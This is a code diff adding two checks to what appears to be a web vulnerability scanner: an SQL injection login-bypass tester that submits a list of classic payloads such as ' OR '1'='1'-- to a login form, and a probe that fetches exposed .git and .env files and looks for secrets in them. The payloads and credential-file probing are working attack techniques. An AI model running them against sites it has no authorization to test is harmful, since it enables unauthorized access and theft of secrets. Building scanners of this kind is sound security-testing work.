@@ -845,3 +845,217 @@ async def test_default_credentials(
     except Exception as exc:
         logger.debug("test_default_credentials_error", url=login_url, error=str(exc))
         return {"vulnerable": False, "url": login_url, "error": str(exc)}
+
+
+# ---------------------------------------------------------------------------
+# 8. SQLi Authentication Bypass
+# ---------------------------------------------------------------------------
+
+_SQLI_AUTH_PAYLOADS = [
+    ("' OR '1'='1'--", "admin"),
+    ("' OR '1'='1'#", "admin"),
+    ("admin'--", "admin"),
+    ("' OR 1=1--", "password"),
+    ("') OR ('1'='1", "admin"),
+    ("admin' OR '1'='1'--", "password"),
+    ("\" OR \"1\"=\"1\"--", "admin"),
+]
+
+
+async def test_sqli_auth_bypass(
+    login_url: str,
+    form_data: dict[str, Any],
+) -> dict[str, Any]:
+    """Test SQL injection authentication bypass against a login form.
+
+    Parameters
+    ----------
+    login_url:
+        URL of the login page.
+    form_data:
+        Dict with keys ``username_field``, ``password_field``,
+        ``action_url`` (optional -- defaults to *login_url*),
+        ``method`` (optional -- defaults to ``POST``),
+        and ``extra_fields`` (optional dict of hidden fields like CSRF tokens).
+    """
+    username_field = form_data.get("username_field", "username")
+    password_field = form_data.get("password_field", "password")
+    action_url = form_data.get("action_url") or login_url
+    method = (form_data.get("method") or "POST").upper()
+
+    # Resolve relative action URLs.
+    if action_url and not action_url.startswith("http"):
+        action_url = urljoin(login_url, action_url)
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            # Fetch the login page once to capture baseline failure text.
+            base_status, base_body, _base_headers = await _fetch(session, login_url)
+
+            if base_status == 0:
+                return {"vulnerable": False, "url": login_url, "error": "Could not reach login page"}
+
+            baseline_failures = set(_FAILURE_INDICATORS.findall(base_body.lower()))
+
+            # Baseline: submit with obviously wrong credentials to detect
+            # sites that redirect everything (not a success signal).
+            baseline_redirect_location = None
+            try:
+                bl_get_status, bl_get_body, _ = await _fetch(session, login_url)
+                bl_hidden = _extract_hidden_fields(bl_get_body) if bl_get_status else {}
+                extra = form_data.get("extra_fields")
+                if isinstance(extra, dict):
+                    bl_hidden.update(extra)
+                bl_data = {
+                    **bl_hidden,
+                    username_field: f"bughound_invalid_{id(session)}",
+                    password_field: f"bughound_invalid_{id(session)}",
+                }
+                bl_status, _bl_body, bl_headers = await _fetch(
+                    session, action_url, method=method,
+                    data=bl_data, allow_redirects=False,
+                )
+                if bl_status in (301, 302, 303, 307, 308):
+                    baseline_redirect_location = bl_headers.get("location", "")
+            except Exception:
+                pass  # If baseline fails, proceed without it
+
+            for sqli_username, sqli_password in _SQLI_AUTH_PAYLOADS:
+                # GET the login page fresh to extract CSRF / hidden tokens.
+                get_status, get_body, _get_headers = await _fetch(session, login_url)
+                if get_status == 0:
+                    continue
+
+                hidden_fields = _extract_hidden_fields(get_body)
+
+                extra = form_data.get("extra_fields")
+                if isinstance(extra, dict):
+                    hidden_fields.update(extra)
+
+                # Build the POST body with SQLi payload as the username.
+                post_data = {
+                    **hidden_fields,
+                    username_field: sqli_username,
+                    password_field: sqli_password,
+                }
+
+                # Submit the login form.
+                post_status, post_body, post_headers = await _fetch(
+                    session,
+                    action_url,
+                    method=method,
+                    data=post_data,
+                    allow_redirects=False,
+                )
+
+                if post_status == 0:
+                    continue
+
+                # Detect success.
+                is_redirect = post_status in (301, 302, 303, 307, 308)
+                has_success_text = bool(_SUCCESS_INDICATORS.search(post_body))
+
+                current_failures = set(_FAILURE_INDICATORS.findall(post_body.lower()))
+                new_failures = current_failures - baseline_failures
+                has_new_failure = bool(new_failures)
+
+                success = False
+                evidence_detail = ""
+
+                if is_redirect:
+                    location = post_headers.get("location", "")
+                    if login_url not in location:
+                        if baseline_redirect_location is not None and location == baseline_redirect_location:
+                            pass  # Same redirect as wrong creds — not a real login
+                        else:
+                            success = True
+                            evidence_detail = f"HTTP {post_status} redirect to {location}"
+
+                if not success and has_success_text and not has_new_failure:
+                    success = True
+                    evidence_detail = "Response contains success indicators (welcome/dashboard/logout)"
+
+                if success:
+                    return {
+                        "vulnerable": True,
+                        "vulnerability_class": "sqli_auth_bypass",
+                        "url": login_url,
+                        "payload": sqli_username,
+                        "evidence": (
+                            f"SQLi auth bypass successful with payload: {sqli_username} "
+                            f"-- {evidence_detail}"
+                        ),
+                        "confidence": "high",
+                    }
+
+            # No payloads worked.
+            return {
+                "vulnerable": False,
+                "vulnerability_class": "sqli_auth_bypass",
+                "url": login_url,
+                "evidence": f"Tested {len(_SQLI_AUTH_PAYLOADS)} SQLi auth bypass payloads -- none accepted",
+                "confidence": "info",
+            }
+
+    except Exception as exc:
+        logger.debug("test_sqli_auth_bypass_error", url=login_url, error=str(exc))
+        return {"vulnerable": False, "url": login_url, "error": str(exc)}
+
+
+# ---------------------------------------------------------------------------
+# 9. Git / Env Exposure
+# ---------------------------------------------------------------------------
+
+
+async def test_git_exposure(base_url: str) -> dict[str, Any]:
+    """Check if .git directory or .env files are exposed."""
+    git_paths = [
+        "/.git/HEAD",
+        "/.git/config",
+        "/.env",
+        "/.env.local",
+        "/.env.production",
+    ]
+    try:
+        async with aiohttp.ClientSession() as session:
+            for path in git_paths:
+                url = f"{base_url.rstrip('/')}{path}"
+                status, body, headers = await _fetch(session, url)
+                if status == 200:
+                    if path == "/.git/HEAD" and "ref: refs/" in body:
+                        return {
+                            "vulnerable": True,
+                            "url": url,
+                            "type": "git_exposure",
+                            "evidence": f"Git HEAD exposed: {body.strip()[:100]}",
+                            "confidence": "high",
+                        }
+                    elif path == "/.git/config" and "[core]" in body:
+                        return {
+                            "vulnerable": True,
+                            "url": url,
+                            "type": "git_exposure",
+                            "evidence": "Git config exposed with repository details",
+                            "confidence": "high",
+                        }
+                    elif path.startswith("/.env") and (
+                        "=" in body and len(body) < 10000
+                    ):
+                        # Check it's actually an env file, not an HTML error page
+                        if not body.strip().startswith("<") and (
+                            "DB_" in body
+                            or "API_" in body
+                            or "SECRET" in body
+                            or "PASSWORD" in body
+                            or "KEY=" in body
+                        ):
+                            return {
+                                "vulnerable": True,
+                                "url": url,
+                                "type": "env_exposure",
+                                "evidence": f".env file exposed ({len(body)} bytes)",
+                                "confidence": "high",
+                            }
+    except Exception:
+        pass
+    return {"vulnerable": False}
